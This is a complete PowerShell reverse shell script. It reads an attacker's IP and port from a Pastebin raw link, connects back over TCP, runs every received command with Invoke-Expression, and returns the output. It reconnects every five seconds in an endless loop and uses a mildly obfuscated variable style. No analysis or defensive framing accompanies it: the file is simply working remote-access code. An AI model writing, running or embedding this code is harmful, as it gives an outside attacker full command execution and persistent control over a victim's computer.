While($true) {
    Try { 
$pastebinLink = 'https://pastebin.com/raw/b9j9rc8N'

# Retrieve content from Pastebin
$pastebinContent = Invoke-RestMethod -Uri $pastebinLink

# Split the content into IP address and port
$ip, $port = $pastebinContent -split ':'

# Create TCP client and connect
Set-Variable -Name client -Value (New-Object System.Net.Sockets.TCPClient($ip, $port))
Set-Variable -Name stream -Value ($client.GetStream())

# Receive and execute commands
[byte[]]$bytes = 0..65535|%{0}
while ((Set-Variable -Name i -Value ($stream.Read($bytes, 0, $bytes.Length))) -ne 0) {
    Set-Variable -Name data -Value ((New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i))
    Set-Variable -Name sendback -Value (iex $data 2>&1 | Out-String)
    Set-Variable -Name sendback2 -Value ($sendback + 'PS ' + (pwd).Path + '> ')
    Set-Variable -Name sendbyte -Value (([text.encoding]::ASCII).GetBytes($sendback2))
    $stream.Write($sendbyte, 0, $sendbyte.Length)
    $stream.Flush()
        }
    } Catch {
        Write-Host "Connection failed. Retrying in 5 seconds..."
        Start-Sleep -Seconds 5
    }
}
